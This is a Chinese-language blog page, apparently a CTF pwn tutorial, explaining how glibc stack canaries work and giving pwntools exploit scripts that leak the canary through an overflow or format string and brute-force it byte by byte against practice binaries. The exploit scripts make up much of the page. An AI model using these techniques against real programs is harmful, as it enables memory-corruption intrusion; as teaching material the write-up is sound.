@@ -1,0 +1,684 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/enter-line.ico">
+  <link rel="icon" href="/img/enter-line.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="TKYmax">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="初识Canary关于canary说白了就是一个防止栈溢出的手段，一般情况下是在栈底前边设置一个值，在进程结束时，对比这个值有没有被篡改，如果篡改就退出。具体汇编如下函数开始前在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 rbp-0x8 的位置(32位ebp-0x4。但是这个位置不是绝对的，可以通过ida分析)。 这个操作即为向栈中插入 Canary 值 12mov    rax,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="绕过保护之Canary">
+<meta property="og:url" content="http://example.com/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/index.html">
+<meta property="og:site_name" content="能打八个攻城狮">
+<meta property="og:description" content="初识Canary关于canary说白了就是一个防止栈溢出的手段，一般情况下是在栈底前边设置一个值，在进程结束时，对比这个值有没有被篡改，如果篡改就退出。具体汇编如下函数开始前在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 rbp-0x8 的位置(32位ebp-0x4。但是这个位置不是绝对的，可以通过ida分析)。 这个操作即为向栈中插入 Canary 值 12mov    rax,">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711205256772-1243982130.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711210624943-2102099079.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711211553329-1811041622.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711212205701-952311395.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711213242742-1322553195.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711213804728-1208603033.png">
+<meta property="og:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711214015987-1913848852.png">
+<meta property="article:published_time" content="2024-07-18T08:21:08.000Z">
+<meta property="article:modified_time" content="2024-07-18T13:44:27.139Z">
+<meta property="article:author" content="TKYmax">
+<meta property="article:tag" content="栈">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/07/18/hello-world/3340174-20240711205256772-1243982130.png">
+  
+  
+  
+  <title>绕过保护之Canary - 能打八个攻城狮</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>能打八个攻城狮</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="绕过保护之Canary"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-18 16:21" pubdate>
+          2024年7月18日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">绕过保护之Canary</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="初识Canary"><a href="#初识Canary" class="headerlink" title="初识Canary"></a>初识Canary</h1><p><strong>关于canary说白了就是一个防止栈溢出的手段，一般情况下是在栈底前边设置一个值，在进程结束时，对比这个值有没有被篡改，如果篡改就退出。具体汇编如下</strong><br><strong>函数开始前在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 rbp-0x8 的位置(32位ebp-0x4。但是这个位置不是绝对的，可以通过ida分析)。 这个操作即为向栈中插入 Canary 值</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure>
+<p><strong>函数结束时，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure>
+<p><img src="/2024/07/18/hello-world/3340174-20240711205256772-1243982130.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>如果 Canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，这个函数不同的libc会不同（从glibc开始 2.27后稍有不同）定义如下</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p><strong>在没有开启FULL RELRO保护时，我们可以通过劫持GOT表，然后触发Canary检测报错，这时就会进入劫持的地址。另一种是利用fortify_fail函数打印关键信息</strong><br><strong>关于Canary的储存地址，对于Liunx来说，fs寄存器实际指向的是当前进程的TLS结构，fs：0x28指向的正式stack_guard。如果溢出条件合适，我们完全可以覆盖TLS中保存的Canary值</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure>
+<p><strong>这个值由ssecurity_init函数来初始化</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure>
+<p><strong>Canary的最后一个字节呗设置为0，防止类似与printf(“%s” , &amp;buf)，形式的函数不小心打印出来，所以我们可以把这个0给覆盖，用打印函数来覆盖，这样就泄露了Canary的值</strong></p>
+<h1 id="Canary保护机制总结"><a href="#Canary保护机制总结" class="headerlink" title="Canary保护机制总结"></a>Canary保护机制总结</h1><ol>
+<li><strong>_dl_random由Kernel写入</strong></li>
+<li><strong>security_init 函数将_dl_random 的最后一个字节设置为0，防止 printf(“%s”)这类打印函数不小心泄露 Canary。</strong></li>
+<li><strong>security_init 函数将 Canary 值设置到 TLS 中。</strong></li>
+<li><strong>在函数开始时，会取出TLS中的Canary值放在ebp-4h(64位系统为rbp-8h)<br>中，即防止通过栈溢出修改 ebp 和返回地址。</strong></li>
+<li><strong>在函数结束时，会取出ebp-4h(64位系统为rbp-8h)的值，并与 TLS 中的 Canar值进行异或，判断是否为0。若结果为0，则检查通过;若结果不为0，则检查不通过，进人stack_chk_fail 函数</strong></li>
+</ol>
+<h2 id="Canary保护机制主要有两个漏洞"><a href="#Canary保护机制主要有两个漏洞" class="headerlink" title="Canary保护机制主要有两个漏洞"></a>Canary保护机制主要有两个漏洞</h2><ul>
+<li><strong>stack_chk_fai1函数会有信息输出，如果我们能够控制 libc_argv[0]，就能够通过stack_chk fail函数泄露出我们想要的信息，这个技术被称为 stacksmashes(glibc 2.27 和 2.27之后的版本会有一些变化)。</strong></li>
+<li>如果我们有一个很长的栈溢出，那么可以直接溢出TLS 中的 a1_random 的值，因此可以绕过 Canary 保护。当然，这里可能还需要一个多线程的条件，可以在后续例<br>题中看到。</li>
+</ul>
+<h2 id="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："><a href="#对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：" class="headerlink" title="对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点："></a>对于有Canary的程序，如果考虑栈溢出攻击，主要有四个攻击点：</h2><ol>
+<li><strong>利用泄露函数泄露出 Canary 的值，再进行利用。</strong></li>
+<li><strong>爆破得到 Canary 的值。</strong></li>
+<li><strong>stack_chk fai1 函数泄露关键信息。</strong></li>
+<li><strong>修改 TLS 中的 stack quard 值。</strong></li>
+</ol>
+<h1 id="泄露Canary值"><a href="#泄露Canary值" class="headerlink" title="泄露Canary值"></a>泄露Canary值</h1><p><strong><a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/leak_canary">附件下载</a></strong><br><img src="/2024/07/18/hello-world/3340174-20240711210624943-2102099079.png" srcset="/img/loading.gif" lazyload><br><strong>注意点Canary值距离ebp为0xc，然后通过栈溢出覆盖最后一位0，通过打印函数打印出来cancary</strong></p>
+<ol>
+<li><strong>第一种是用栈溢出漏洞</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>canary_addr = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>payload2 += p32(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>payload2 += p32(target)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure></li>
+<li>第二种是利用格式化字符串<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>p1 = <span class="hljs-string">&#x27;%&#123;offset&#125;$p\n&#x27;</span>.<span class="hljs-built_in">format</span>(offset = <span class="hljs-number">71</span>)<br><br>p.send(p1)<br>canary_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span> , drop=<span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br><br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>p2 += <span class="hljs-number">0xc</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p2 += p32(target)<br><br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="逐字节爆破Canary"><a href="#逐字节爆破Canary" class="headerlink" title="逐字节爆破Canary"></a>逐字节爆破Canary</h1><p><strong><a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/one_by_one_bruteforce">附件下载</a></strong><br><strong>这种方法局限性比较大，必须有fork函数开启子进程。因为fork函数会直接拷贝父进程内存，所以创建的子进程canary都是相同的</strong><br><img src="/2024/07/18/hello-world/3340174-20240711211553329-1811041622.png" srcset="/img/loading.gif" lazyload><br><strong>我们一直fork开启子进程，一个一个字节的爆破</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./one_by_one_bruteforce&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce1bit</span>() :<br>  <span class="hljs-keyword">global</span> known<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    p1 = <span class="hljs-number">0x108</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>    p1 += known<br>    p1 += <span class="hljs-built_in">bytes</span>([i])<br>    p.sendafter(<span class="hljs-string">&#x27;one_by_one_bruteforce\n&#x27;</span>,p1)<br>    <span class="hljs-keyword">try</span> :<br>      info = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;*** stack smashing detected ***&quot;</span> <span class="hljs-keyword">in</span> info :<br>        p.send(<span class="hljs-string">&#x27;n\n&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">else</span> :<br>        known += <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        log.info(<span class="hljs-string">&#x27;wrong&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>      <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce_canary</span>():<br>  <span class="hljs-keyword">global</span> known<br>  known += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    bruteforce1bit()<br>    <span class="hljs-keyword">if</span> i != <span class="hljs-number">6</span> :<br>      p.send(<span class="hljs-string">b&#x27;n\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span> :<br>      p.send(<span class="hljs-string">b&#x27;y\n&#x27;</span>)<br><br>target = <span class="hljs-number">0x000000000040083E</span><br>known = <span class="hljs-string">b&quot;&quot;</span><br>bruteforce_canary()<br>canary = u64(known)  <span class="hljs-comment"># Ensure known is 8 bytes</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(target)<br>p.sendafter(<span class="hljs-string">b&quot;go\n&quot;</span>, p2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p>| 这两个理解起来都很简单，没有什么难点，看着exp很容易理解</p>
+<h1 id="stack-smashes"><a href="#stack-smashes" class="headerlink" title="stack_smashes"></a>stack_smashes</h1><p><strong><a target="_blank" rel="noopener" href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/stack_smashes">附件下载</a></strong></p>
+<p><strong>前边已经简绍了，_stack_chk_fail函数会将__libc_agrc[0]的信息打印出来，所以我们可以改变__libc_agrc[0]的地址为我们想要信息的值，那么就能得到相应数据了</strong><br><img src="/2024/07/18/hello-world/3340174-20240711212205701-952311395.png" srcset="/img/loading.gif" lazyload><br><strong>首先简绍一下什么是__libc_agrc[0]</strong></p>
+<p><strong>main(int argc , char ,*argv[ ])</strong></p>
+<ol>
+<li><strong>argc为整数</strong></li>
+<li><strong>argv为指针的指针（可理解为：char **argv or: char *argv[] or: char argv[][] ，argv是一个指针数组)</strong><br><strong>注：main()括号内是固定的写法。</strong></li>
+<li><strong>下面给出一个例子来理解这两个参数的用法：</strong><br>**　假设程序的名称为prog，**<br><strong>当只输入prog，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;1,表示只有一程序名称。</strong><br><strong>argc只有一个元素，argv[0]指向输入的程序路径及名称：.&#x2F;prog</strong><br><strong>当输入prog para_1，有一个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;2，表示除了程序名外还有一个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>当输入prog para_1 para_2 有2个参数，则由操作系统传来的参数为：</strong><br><strong>argc&#x3D;3，表示除了程序名外还有2个参数。</strong><br><strong>argv[0]指向输入的程序路径及名称。</strong><br><strong>argv[1]指向参数para_1字符串。</strong><br><strong>argv[2]指向参数para_2字符串。</strong></li>
+<li><strong>void main( int argc, char *argv[] )</strong><br><strong>char *argv[] : argv 是一个指针数组，他的元素个数是argc，存放的是指向每一个参数的指针</strong></li>
+</ol>
